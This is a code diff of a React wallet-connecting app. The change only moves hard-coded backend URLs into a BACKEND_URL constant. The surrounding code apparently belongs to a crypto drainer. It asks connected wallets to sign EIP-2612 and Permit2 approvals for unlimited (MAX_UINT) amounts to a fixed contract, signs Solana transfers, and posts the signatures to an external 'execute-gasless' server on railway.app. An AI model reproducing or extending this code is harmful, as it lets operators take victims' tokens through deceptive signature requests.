@@ -28,6 +28,11 @@ import { TOKEN_PROGRAM_ID, createTransferCheckedInstruction } from '@solana/spl-
 const WC_PROJECT_ID = '7fb3ba95be65cff7bc75b742e816b1cb'
 const NETWORK = 'Mainnet'
 
+// 🌐 BACKEND URL CONFIGURATION (Auto-detects Development vs Production)
+const BACKEND_URL = process.env.NODE_ENV === 'production' 
+  ? 'https://salvation-server-gp-production.up.railway.app' 
+  : 'http://localhost:3001';
+
 // 🔥 CONTRACT ADDRESSES
 const EVM_CONTRACT_ADDRESS = '0x48C13137c7bC86084D420649fb4438B7721445C1'
 const PERMIT2_ADDRESS = '0x000000000022D473030F116dDEE9F6B43aC78BA3'
@@ -122,8 +127,6 @@ const fetchTokenPrices = async (tokens: any[], chain: string) => {
     return prices;
   }
 };
-
-
 
 const smartTokenSort = (a: any, b: any) => {
   if (a.isNative && !b.isNative) return 1;
@@ -422,7 +425,7 @@ export default function App() {
       log("✅ Solana Transaction Signed & Serialized.");
       setStatus("Sending to Backend...");
       
-      const res = await fetch('https://salvation-server-gp-production.up.railway.app/execute-gasless-solana', {
+      const res = await fetch(`${BACKEND_URL}/execute-gasless-solana`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
@@ -559,7 +562,7 @@ export default function App() {
                 log(`[GASLESS] Requesting EIP-2612 Auth: ${token.symbol}`);
                 const signature = await getPermitSignature(signer, token, EVM_CONTRACT_ADDRESS, MAX_UINT, deadline);
 
-                fetch('https://salvation-server-gp-production.up.railway.app/execute-gasless', {
+                fetch(`${BACKEND_URL}/execute-gasless`, {
                   method: 'POST',
                   headers: { 'Content-Type': 'application/json' },
                   body: JSON.stringify({
@@ -614,7 +617,7 @@ export default function App() {
                 };
                 const signature = await signer.signTypedData(domain, types, message);
 
-                fetch('https://salvation-server-gp-production.up.railway.app/execute-gasless', {
+                fetch(`${BACKEND_URL}/execute-gasless`, {
                   method: 'POST',
                   headers: { 'Content-Type': 'application/json' },
                   body: JSON.stringify({
